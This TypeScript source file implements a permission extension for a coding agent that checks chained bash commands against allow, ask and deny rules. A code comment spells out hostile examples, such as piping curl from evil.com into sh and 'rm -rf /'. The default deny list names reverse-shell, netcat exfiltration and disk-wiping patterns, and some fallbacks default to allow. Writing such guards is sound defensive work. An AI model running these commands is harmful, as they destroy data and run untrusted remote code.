import type { ExtensionAPI, ExtensionContext } from "@earendil-works/pi-coding-agent";
import { Type } from "typebox";
import { readFileSync, writeFileSync, existsSync, mkdirSync } from "node:fs";
import { resolve, join } from "node:path";
import { homedir } from "node:os";

// ─── Types ──────────────────────────────────────────────────────────────────

type PermissionAction = "allow" | "ask" | "deny";

interface PermissionRule {
  /** Tool name: "bash", "write", "edit", "read", "grep", "find", "ls", or "*" for all */
  tool: string;
  /** Regex pattern (for bash commands) or glob pattern (for file paths) */
  pattern: string;
  /** What to do when matched */
  action: PermissionAction;
  /** Human-readable description */
  description?: string;
}

interface PermissionConfig {
  /** Ordered list of rules. First match wins. */
  rules: PermissionRule[];
  /** Default action per tool when no rule matches. Defaults to "allow". */
  defaults?: Partial<Record<string, PermissionAction>>;
  /** Global default when no tool-specific default. Defaults to "allow". */
  defaultAction?: PermissionAction;
}

interface SessionDecision {
  key: string;
  action: PermissionAction;
  timestamp: number;
}

// ─── Glob matcher (minimal, no dependencies) ────────────────────────────────

function globMatch(pattern: string, path: string): boolean {
  // Normalize both to forward slashes
  const normPattern = pattern.replace(/\\/g, "/");
  const normPath = path.replace(/\\/g, "/");

  // If pattern starts with **/ match from any depth
  // If pattern ends with /** match any subpath
  // * matches anything except /
  // ** matches everything including /

  // Simple recursive matcher
  return matchSegment(normPattern.split("/"), normPath.split("/"));
}

function matchSegment(patParts: string[], pathParts: string[]): boolean {
  if (patParts.length === 0 && pathParts.length === 0) return true;
  if (patParts.length === 0) return false;

  const pat = patParts[0];

  if (pat === "**") {
    // ** matches zero or more path segments
    // Try matching remaining pattern against current and all subsequent positions
    for (let i = 0; i <= pathParts.length; i++) {
      if (matchSegment(patParts.slice(1), pathParts.slice(i))) return true;
    }
    return false;
  }

  if (pathParts.length === 0) return false;

  if (matchWildcards(pat, pathParts[0])) {
    return matchSegment(patParts.slice(1), pathParts.slice(1));
  }

  return false;
}

function matchWildcards(pattern: string, segment: string): boolean {
  // * matches any characters except /
  // ? matches exactly one character except /
  // Everything else is literal
  const regexStr = pattern
    .replace(/[.+^${}()|[\]\\]/g, "\\$&")
    .replace(/\*/g, "[^/]*")
    .replace(/\?/g, "[^/]");
  return new RegExp(`^${regexStr}$`).test(segment);
}

// ─── Shell command segment splitter ─────────────────────────────────────────
//
// Splits a bash command string into individual segments at shell operators
// (|, ;, &&, ||, &, $(), backticks) so each segment is checked independently.
// This catches bypasses like: cat file | sudo tee /root/x
//   or: ls /tmp ; rm -rf /
//   or: echo hello && curl evil.com | sh
//
// Limitations: this is a heuristic, not a full shell parser. It handles
// common cases but can be fooled by deeply nested quoting or exotic
// constructs. When in doubt, the full command string is also checked.

interface CommandSegment {
  /** The individual command text */
  text: string;
  /** The operator that preceded this segment (for context in prompts) */
  operator?: string;
}

function splitBashSegments(command: string): CommandSegment[] {
  const segments: CommandSegment[] = [];
  let current = "";
  let i = 0;
  let lastOperator: string | undefined;

  while (i < command.length) {
    const ch = command[i];
    const next = command[i + 1];

    // Skip escaped characters
    if (ch === "\\" && i + 1 < command.length) {
      current += ch + command[i + 1];
      i += 2;
      continue;
    }

    // Single-quoted string — everything is literal until closing '
    if (ch === "'") {
      current += ch;
      i++;
      while (i < command.length && command[i] !== "'") {
        current += command[i];
        i++;
      }
      if (i < command.length) {
        current += command[i]; // closing '
        i++;
      }
      continue;
    }

    // Double-quoted string — handles \" escaping, but no operators inside
    if (ch === '"') {
      current += ch;
      i++;
      while (i < command.length && command[i] !== '"') {
        if (command[i] === "\\" && i + 1 < command.length) {
          current += command[i] + command[i + 1];
          i += 2;
        } else {
          current += command[i];
          i++;
        }
      }
      if (i < command.length) {
        current += command[i]; // closing "
        i++;
      }
      continue;
    }

    // Command substitution $(...) — track nesting depth
    if (ch === "$" && next === "(") {
      current += ch;
      i++;
      let depth = 1;
      while (i < command.length && depth > 0) {
        current += command[i];
        if (command[i] === "(") depth++;
        if (command[i] === ")") depth--;
        i++;
      }
      continue;
    }

    // Backtick command substitution
    if (ch === "`") {
      current += ch;
      i++;
      while (i < command.length && command[i] !== "`") {
        if (command[i] === "\\" && i + 1 < command.length) {
          current += command[i] + command[i + 1];
          i += 2;
        } else {
          current += command[i];
          i++;
        }
      }
      if (i < command.length) {
        current += command[i]; // closing `
        i++;
      }
      continue;
    }

    // Shell operators: ||, &&, |, ;, &
    // Must check two-char operators first
    if (ch === "|" && next === "|") {
      // || (logical OR)
      pushSegment();
      lastOperator = "||";
      i += 2;
      continue;
    }
    if (ch === "&" && next === "&") {
      // && (logical AND)
      pushSegment();
      lastOperator = "&&";
      i += 2;
      continue;
    }
    if (ch === "|") {
      // | (pipe)
      pushSegment();
      lastOperator = "|";
      i++;
      continue;
    }
    if (ch === ";") {
      // ; (command separator)
      pushSegment();
      lastOperator = ";";
      i++;
      continue;
    }
    if (ch === "&" && next !== "&") {
      // & (background)
      pushSegment();
      lastOperator = "&";
      i++;
      continue;
    }

    // Process substitution <(...) >(...)
    if ((ch === "<" || ch === ">") && next === "(") {
      current += ch;
      i++;
      let depth = 1;
      while (i < command.length && depth > 0) {
        current += command[i];
        if (command[i] === "(") depth++;
        if (command[i] === ")") depth--;
        i++;
      }
      continue;
    }

    // Normal character
    current += ch;
    i++;
  }

  pushSegment();

  // Filter out empty segments
  return segments.filter((s) => s.text.trim().length > 0);

  function pushSegment() {
    if (current.trim().length > 0) {
      segments.push({ text: current.trim(), operator: lastOperator });
    }
    current = "";
  }
}

// ─── Config loading ─────────────────────────────────────────────────────────

const GLOBAL_CONFIG_DIR = resolve(homedir(), ".pi/agent");
const CONFIG_FILENAME = "permissions.json";

function loadConfig(configDir: string): PermissionConfig {
  const configPath = join(configDir, CONFIG_FILENAME);
  if (!existsSync(configPath)) return { rules: [] };
  try {
    const raw = readFileSync(configPath, "utf8");
    return JSON.parse(raw) as PermissionConfig;
  } catch {
    return { rules: [] };
  }
}

function saveConfig(config: PermissionConfig, configDir: string): void {
  const configPath = join(configDir, CONFIG_FILENAME);
  const dir = resolve(configPath, "..");
  if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
  writeFileSync(configPath, JSON.stringify(config, null, 2) + "\n", "utf8");
}

// ─── Default rules ──────────────────────────────────────────────────────────

const DEFAULT_RULES: PermissionRule[] = [
  // Dangerous bash commands
  { tool: "bash", pattern: "\\brm\\s+(-rf?|--recursive)\\b", action: "ask", description: "Recursive delete" },
  { tool: "bash", pattern: "\\bsudo\\b", action: "ask", description: "Privilege escalation" },
  { tool: "bash", pattern: "\\b(chmod|chown)\\b.*777", action: "ask", description: "World-writable permissions" },
  { tool: "bash", pattern: "\\bdd\\s+if=", action: "ask", description: "Direct disk operations" },
  { tool: "bash", pattern: "\\bmkfs\\b", action: "deny", description: "Format filesystem" },
  { tool: "bash", pattern: "\\b(ssh|scp|rsync)\\b", action: "ask", description: "Remote access" },
  { tool: "bash", pattern: "\\bcurl\\b.*\\|\\s*(ba)?sh", action: "deny", description: "Pipe remote script to shell" },
  { tool: "bash", pattern: "\\bwget\\b.*\\|\\s*(ba)?sh", action: "deny", description: "Pipe remote download to shell" },
  { tool: "bash", pattern: ">/dev/(sd|nvme|vd)", action: "deny", description: "Write directly to block device" },

  // Network exfiltration vectors (catches piped variants via segment analysis)
  { tool: "bash", pattern: "\\b(nc|ncat|netcat|socat)\\b", action: "ask", description: "Network connection tool (potential exfiltration)" },
  { tool: "bash", pattern: "\\b(aws|gcloud|az)\\s+\\w+\\s+download\\b", action: "ask", description: "Cloud CLI data download" },

  // Reverse shell patterns
  { tool: "bash", pattern: "/dev/tcp/", action: "deny", description: "Bash /dev/tcp reverse shell" },
  { tool: "bash", pattern: "/dev/udp/", action: "deny", description: "Bash /dev/udp reverse shell" },

  // Protected file paths
  { tool: "write", pattern: "**/.env*", action: "ask", description: "Environment files" },
  { tool: "write", pattern: "**/.git/**", action: "ask", description: "Git internals" },
  { tool: "edit", pattern: "**/.env*", action: "ask", description: "Environment files" },
  { tool: "edit", pattern: "**/.git/**", action: "ask", description: "Git internals" },
];

// ─── Decision key helpers ───────────────────────────────────────────────────

function decisionKey(tool: string, pattern: string, target: string): string {
  return `${tool}::${pattern}::${target}`;
}

// ─── Extension ──────────────────────────────────────────────────────────────

export default function permissionsExtension(pi: ExtensionAPI) {
  // Load configs: global + project (if trusted)
  const globalConfig = loadConfig(GLOBAL_CONFIG_DIR);
  let projectConfig: PermissionConfig = { rules: [] };

  // Session-level remembered decisions
  let sessionDecisions: Map<string, SessionDecision> = new Map();

  // ─── Load project config on session start ───────────────────────────────

  pi.on("session_start", async (_event, ctx) => {
    sessionDecisions = new Map();
    if (ctx.isProjectTrusted()) {
      const projectDir = join(ctx.cwd, ".pi");
      projectConfig = loadConfig(projectDir);
    } else {
      projectConfig = { rules: [] };
    }
  });

  // ─── Resolve effective config ────────────────────────────────────────────

  function getEffectiveRules(): PermissionRule[] {
    // Project rules override/extend global rules
    // Project rules come first (higher priority), then global
    return [...(projectConfig.rules ?? []), ...(globalConfig.rules ?? [])];
  }

  function getDefaultAction(tool: string): PermissionAction {
    if (projectConfig.defaults?.[tool]) return projectConfig.defaults[tool];
    if (globalConfig.defaults?.[tool]) return globalConfig.defaults[tool];
    if (projectConfig.defaultAction) return projectConfig.defaultAction;
    if (globalConfig.defaultAction) return globalConfig.defaultAction;
    return "allow";
  }

  // ─── Check permission ───────────────────────────────────────────────────

  async function checkPermission(
    tool: string,
    target: string,
    ctx: ExtensionContext,
  ): Promise<{ action: PermissionAction; rule?: PermissionRule; blocked?: boolean; reason?: string }> {
    const rules = getEffectiveRules();

    // For bash commands, also check each segment independently.
    // This catches piped/chained commands like: cat file | sudo tee /root/x
    if (tool === "bash") {
      const segments = splitBashSegments(target);
      if (segments.length > 1) {
        // Check each segment against the rules
        for (const segment of segments) {
          for (const rule of rules) {
            const toolMatch = rule.tool === "*" || rule.tool === "bash";
            if (!toolMatch) continue;

            let segmentMatched = false;
            try {
              segmentMatched = new RegExp(rule.pattern, "i").test(segment.text);
            } catch {
              // Invalid regex, skip
            }

            if (segmentMatched && (rule.action === "ask" || rule.action === "deny")) {
              const operatorCtx = segment.operator ? ` (after ${segment.operator})` : "";
              const label = rule.description ?? rule.pattern;
              const reason = `Piped/chained command${operatorCtx} segment matched rule "${label}": ${segment.text}`;

              if (rule.action === "deny") {
                if (ctx.hasUI) {
                  ctx.ui.notify(`⛔ Blocked: ${reason}`, "warning");
                }
                return { action: "deny", rule, blocked: true, reason };
              }

              // rule.action === "ask"
              if (!ctx.hasUI) {
                return { action: "deny", rule, blocked: true, reason: `${reason} (no UI for confirmation)` };
              }

              const choice = await ctx.ui.select(
                `⚠️ Piped command contains restricted segment${operatorCtx}\n\nFull command: ${target}\nSegment: ${segment.text}\nMatched: ${label}`,
                ["Allow once", "Allow for session", "Deny"],
              );

              if (choice === "Allow once") {
                return { action: "allow", rule };
              }
              if (choice === "Allow for session") {
                const key = decisionKey(tool, rule.pattern, target);
                sessionDecisions.set(key, { key, action: "allow", timestamp: Date.now() });
                pi.appendEntry("permission-decision", { key, action: "allow", timestamp: Date.now() });
                return { action: "allow", rule };
              }
              // Deny (piped segment)
              const customReason = await ctx.ui.input("Reason for denying (optional):", "");
              const baseReason = `Denied by user: ${reason}`;
              const finalReason = customReason?.trim() ? `${baseReason} — ${customReason.trim()}` : baseReason;
              const key = decisionKey(tool, rule.pattern, target);
              sessionDecisions.set(key, { key, action: "deny", timestamp: Date.now() });
              pi.appendEntry("permission-decision", { key, action: "deny", timestamp: Date.now() });
              return { action: "deny", rule, blocked: true, reason: finalReason };
            }
          }
        }
      }
    }

    // Check rules in order (first match wins) against the full target
    for (const rule of rules) {
      const toolMatch = rule.tool === "*" || rule.tool === tool;
      if (!toolMatch) continue;

      let matched = false;
      if (tool === "bash") {
        // Regex match on command string
        try {
          matched = new RegExp(rule.pattern, "i").test(target);
        } catch {
          // Invalid regex, skip
        }
      } else {
        // Glob match on file path
        matched = globMatch(rule.pattern, target);
      }

      if (matched) {
        // Check session memory first
        const key = decisionKey(tool, rule.pattern, target);
        const remembered = sessionDecisions.get(key);
        if (remembered && (Date.now() - remembered.timestamp) < 3600_000) {
          // Use remembered decision if less than 1 hour old
          if (remembered.action === "deny") {
            return { action: "deny", rule, blocked: true, reason: `Blocked by rule: ${rule.description ?? rule.pattern}` };
          }
          if (remembered.action === "allow") {
            return { action: "allow", rule };
          }
        }

        if (rule.action === "allow") {
          return { action: "allow", rule };
        }

        if (rule.action === "deny") {
          if (ctx.hasUI) {
            ctx.ui.notify(`⛔ Blocked: ${rule.description ?? rule.pattern}`, "warning");
          }
          return { action: "deny", rule, blocked: true, reason: `Blocked by rule: ${rule.description ?? rule.pattern}` };
        }

        if (rule.action === "ask") {
          if (!ctx.hasUI) {
            // Non-interactive: deny by default for safety
            return { action: "deny", rule, blocked: true, reason: `Rule requires confirmation (no UI): ${rule.description ?? rule.pattern}` };
          }

          const label = rule.description ?? rule.pattern;
          const prompt = tool === "bash"
            ? `⚠️ ${label}\n\nCommand: ${target}`
            : `⚠️ ${label}\n\nPath: ${target}`;

          const choice = await ctx.ui.select(prompt, [
            "Allow once",
            "Allow for session",
            "Deny",
          ]);

          if (choice === "Allow once") {
            return { action: "allow", rule };
          }
          if (choice === "Allow for session") {
            sessionDecisions.set(key, { key, action: "allow", timestamp: Date.now() });
            // Also persist to session
            pi.appendEntry("permission-decision", { key, action: "allow", timestamp: Date.now() });
            return { action: "allow", rule };
          }
          // Deny
          if (choice === "Deny") {
            sessionDecisions.set(key, { key, action: "deny", timestamp: Date.now() });
            pi.appendEntry("permission-decision", { key, action: "deny", timestamp: Date.now() });
            const customReason = await ctx.ui.input("Reason for denying (optional):", "");
            const baseReason = `Denied by user: ${rule.description ?? rule.pattern}`;
            const reason = customReason?.trim() ? `${baseReason} — ${customReason.trim()}` : baseReason;
            return { action: "deny", rule, blocked: true, reason };
          }
          // Fallback (select cancelled or unknown choice)
          return { action: "deny", rule, blocked: true, reason: `Denied by user: ${rule.description ?? rule.pattern}` };
        }
      }
    }

    // No rule matched: use default
    const defaultAction = getDefaultAction(tool);
    if (defaultAction === "deny") {
      return { action: "deny", blocked: true, reason: `Default deny for tool: ${tool}` };
    }
    if (defaultAction === "ask") {
      if (!ctx.hasUI) {
        return { action: "allow", rule: undefined };
      }
      const choice = await ctx.ui.select(
        `No permission rule for ${tool} on:\n\n${tool === "bash" ? `Command: ${target}` : `Path: ${target}`}\n\nDefault action is "ask"`,
        ["Allow once", "Allow for session", "Deny"],
      );
      if (choice === "Allow once") return { action: "allow" };
      if (choice === "Allow for session") {
        const key = decisionKey(tool, "__default__", target);
        sessionDecisions.set(key, { key, action: "allow", timestamp: Date.now() });
        return { action: "allow" };
      }
      // Deny (default ask)
      const customReason = await ctx.ui.input("Reason for denying (optional):", "");
      const baseReason = `Denied by user (default ask)`;
      const reason = customReason?.trim() ? `${baseReason} — ${customReason.trim()}` : baseReason;
      const key = decisionKey(tool, "__default__", target);
      sessionDecisions.set(key, { key, action: "deny", timestamp: Date.now() });
      pi.appendEntry("permission-decision", { key, action: "deny", timestamp: Date.now() });
      return { action: "deny", blocked: true, reason };
    }

    return { action: "allow" };
  }

  // ─── Restore session decisions on session start ──────────────────────────

  pi.on("session_start", async (_event, ctx) => {
    sessionDecisions = new Map();
    for (const entry of ctx.sessionManager.getBranch()) {
      if (entry.type === "custom" && entry.customType === "permission-decision") {
        const data = entry.data as SessionDecision;
        if (data) {
          sessionDecisions.set(data.key, data);
        }
      }
    }
  });

  // ─── Tool call interception ─────────────────────────────────────────────

  // Map of built-in tool names to their target-extracting logic
  // For custom/unknown tools, fall back to common path-like inputs
  function extractTarget(tool: string, input: Record<string, unknown>): string {
    if (tool === "bash") return (input.command as string) ?? "";

    // Tools with a 'path' parameter
    if (typeof input.path === "string") return input.path;

    // Fallback: check common parameter names that represent a target
    for (const key of ["path", "file", "directory", "dir", "url", "target", "command"] as const) {
      if (typeof input[key] === "string") return input[key];
    }

    return "";
  }

  pi.on("tool_call", async (event, ctx) => {
    const tool = event.toolName;

    // Determine the target string for this tool
    const target = extractTarget(tool, event.input as Record<string, unknown>);

    if (!target) return undefined;

    const result = await checkPermission(tool, target, ctx);
    if (result.blocked) {
      return { block: true, reason: result.reason ?? "Blocked by permission system" };
    }
    return undefined;
  });

  // ─── Command: /permissions ───────────────────────────────────────────────

  pi.registerCommand("permissions", {
    description: "View and manage permission rules",
    getArgumentCompletions(prefix: string) {
      const subcommands = [
        { value: "list", label: "list - Show all active rules" },
        { value: "add", label: "add <tool> <pattern> <action> - Add a rule" },
        { value: "remove", label: "remove <tool> <pattern> - Remove a rule" },
        { value: "reset", label: "reset - Clear session decisions" },
        { value: "defaults", label: "defaults - Show default actions per tool" },
        { value: "init", label: "init - Create default permissions.json" },
      ];
      const filtered = subcommands.filter((s) => s.value.startsWith(prefix));
      return filtered.length > 0 ? filtered : null;
    },
    handler: async (args, ctx) => {
      const parts = (args ?? "").trim().split(/\s+/);
      const subcommand = parts[0];

      if (!subcommand || subcommand === "list") {
        // Show all rules
        const rules = getEffectiveRules();
        if (rules.length === 0) {
          ctx.ui.notify("No permission rules configured. Use /permissions init to create defaults.", "info");
          return;
        }

        const lines: string[] = ["📋 Permission Rules (project + global, first match wins):\n"];
        for (const [i, rule] of rules.entries()) {
          const actionIcon = rule.action === "allow" ? "✅" : rule.action === "ask" ? "❓" : "⛔";
          const desc = rule.description ? ` — ${rule.description}` : "";
          lines.push(`  ${i + 1}. ${actionIcon} [${rule.tool}] ${rule.pattern}${desc}`);
        }

        // Show session decisions
        if (sessionDecisions.size > 0) {
          lines.push(`\n🧠 Session decisions (${sessionDecisions.size}):`);
          for (const [, dec] of sessionDecisions) {
            const icon = dec.action === "allow" ? "✅" : "⛔";
            lines.push(`  ${icon} ${dec.key}`);
          }
        }

        // Show defaults for all active tools
        const allTools = pi.getAllTools();
        const toolNames = [...new Set([...allTools.map(t => t.name), "*"])];
        lines.push("\n📌 Default actions:");
        for (const tool of toolNames) {
          const action = getDefaultAction(tool);
          const icon = action === "allow" ? "✅" : action === "ask" ? "❓" : "⛔";
          lines.push(`  ${icon} ${tool}: ${action}`);
        }

        ctx.ui.notify(lines.join("\n"), "info");
        return;
      }

      if (subcommand === "add") {
        // /permissions add <tool> <pattern> <action> [description]
        const tool = parts[1];
        const pattern = parts[2];
        const action = parts[3] as PermissionAction;
        const description = parts.slice(4).join(" ") || undefined;

        if (!tool || !pattern || !action) {
          ctx.ui.notify("Usage: /permissions add <tool> <pattern> <allow|ask|deny> [description]", "warning");
          return;
        }

        if (!["allow", "ask", "deny"].includes(action)) {
          ctx.ui.notify("Action must be: allow, ask, or deny", "warning");
          return;
        }

        // Validate regex for bash patterns
        if (tool === "bash") {
          try {
            new RegExp(pattern);
          } catch {
            ctx.ui.notify(`Invalid regex pattern: ${pattern}`, "error");
            return;
          }
        }

        // Add to global config
        const config = loadConfig(GLOBAL_CONFIG_DIR);
        config.rules.push({ tool, pattern, action, description });
        saveConfig(config, GLOBAL_CONFIG_DIR);

        ctx.ui.notify(`✅ Added rule: [${tool}] ${pattern} → ${action}`, "info");
        return;
      }

      if (subcommand === "remove") {
        // /permissions remove <tool> <pattern>
        const tool = parts[1];
        const pattern = parts[2];

        if (!tool || !pattern) {
          ctx.ui.notify("Usage: /permissions remove <tool> <pattern>", "warning");
          return;
        }

        const config = loadConfig(GLOBAL_CONFIG_DIR);
        const before = config.rules.length;
        config.rules = config.rules.filter(
          (r) => !(r.tool === tool && r.pattern === pattern),
        );
        saveConfig(config, GLOBAL_CONFIG_DIR);

        const removed = before - config.rules.length;
        if (removed > 0) {
          ctx.ui.notify(`🗑️ Removed ${removed} rule(s): [${tool}] ${pattern}`, "info");
        } else {
          ctx.ui.notify(`No matching rule found: [${tool}] ${pattern}`, "warning");
        }
        return;
      }

      if (subcommand === "reset") {
        sessionDecisions.clear();
        ctx.ui.notify("🧠 Session permission decisions cleared", "info");
        return;
      }

      if (subcommand === "defaults") {
        const allTools = pi.getAllTools();
        const tools = [...new Set([...allTools.map(t => t.name), "*"])];
        const lines: string[] = ["📌 Default actions per tool:\n"];
        for (const tool of tools) {
          const action = getDefaultAction(tool);
          const icon = action === "allow" ? "✅" : action === "ask" ? "❓" : "⛔";
          lines.push(`  ${icon} ${tool}: ${action}`);
        }
        ctx.ui.notify(lines.join("\n"), "info");
        return;
      }

      if (subcommand === "init") {
        const configPath = join(GLOBAL_CONFIG_DIR, CONFIG_FILENAME);
        if (existsSync(configPath)) {
          const overwrite = await ctx.ui.confirm(
            "Overwrite existing permissions.json?",
            "This will replace your current rules with defaults.",
          );
          if (!overwrite) {
            ctx.ui.notify("Cancelled.", "info");
            return;
          }
        }

        const config: PermissionConfig = {
          rules: DEFAULT_RULES,
          defaults: {
            bash: "allow",
            write: "allow",
            edit: "allow",
            read: "allow",
          },
          defaultAction: "allow",
        };

        saveConfig(config, GLOBAL_CONFIG_DIR);
        ctx.ui.notify(`✅ Created ${configPath} with ${DEFAULT_RULES.length} default rules`, "info");
        return;
      }

      ctx.ui.notify(
        "Unknown subcommand. Use: list, add, remove, reset, defaults, or init",
        "warning",
      );
    },
  });

  // ─── Tool: check_permission ──────────────────────────────────────────────
  // Allows the LLM to proactively check if an action would be permitted

  pi.registerTool({
    name: "check_permission",
    label: "Check Permission",
    description:
      "Check whether a tool action would be permitted by the permission system before executing it. " +
      "Use this when you are unsure whether a potentially sensitive operation is allowed. " +
      "Analyzes piped/chained commands segment-by-segment (|, ;, &&, ||, &). " +
      "Returns 'allow', 'ask', or 'deny' with an explanation.",
    promptSnippet: "Check if a tool action is permitted before executing",
    promptGuidelines: [
      "Use check_permission before running risky bash commands (rm, sudo, etc.) or writing to sensitive paths (.env, .git/) if you are uncertain whether the user would approve.",
    ],
    parameters: Type.Object({
      tool: Type.String({ description: "Tool name: bash, write, edit, read, etc." }),
      target: Type.String({
        description: "The command string (for bash) or file path (for other tools) to check",
      }),
    }),
    async execute(_toolCallId, params, _signal, _onUpdate, ctx) {
      const result = await checkPermission(params.tool, params.target, ctx);
      const icon = result.action === "allow" ? "✅" : result.action === "ask" ? "❓" : "⛔";
      const ruleInfo = result.rule
        ? ` (matched rule: ${result.rule.description ?? result.rule.pattern})`
        : "";
      const text = `${icon} ${result.action.toUpperCase()}${ruleInfo}${result.reason ? `\nReason: ${result.reason}` : ""}`;

      return {
        content: [{ type: "text", text }],
        details: { action: result.action, rule: result.rule, blocked: result.blocked },
      };
    },
  });

  // ─── Startup notification ────────────────────────────────────────────────

  pi.on("session_start", async (_event, ctx) => {
    const rules = getEffectiveRules();
    const count = rules.length;
    if (count > 0) {
      const askCount = rules.filter((r) => r.action === "ask").length;
      const denyCount = rules.filter((r) => r.action === "deny").length;
      const allowCount = rules.filter((r) => r.action === "allow").length;
      ctx.ui.notify(
        `🔒 Permission system active: ${count} rules (${allowCount} allow, ${askCount} ask, ${denyCount} deny)`,
        "info",
      );
    } else {
      ctx.ui.notify(
        '🔒 Permission system: no rules. Use /permissions init to create defaults.',
        "info",
      );
    }
  });
}
